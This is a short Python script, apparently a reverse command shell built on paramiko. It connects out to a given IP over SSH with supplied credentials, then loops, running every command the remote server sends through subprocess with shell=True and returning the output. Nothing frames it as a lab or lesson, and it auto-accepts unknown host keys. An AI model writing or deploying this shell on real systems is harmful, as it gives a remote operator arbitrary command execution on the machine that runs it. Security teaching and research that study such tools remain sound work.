#!/bin/python3

import paramiko
import subprocess

def ssh_command(ip, user, passwd, cmd, _port=22):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=ip, username=user, password=passwd, port=_port)
        ssh_session = ssh_client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.send(cmd)
            print(ssh_session.recv(1024))  # Output the response from the server
        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(cmd.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception:
                ssh_session.send(str(Exception))
    finally:
        ssh_client.close()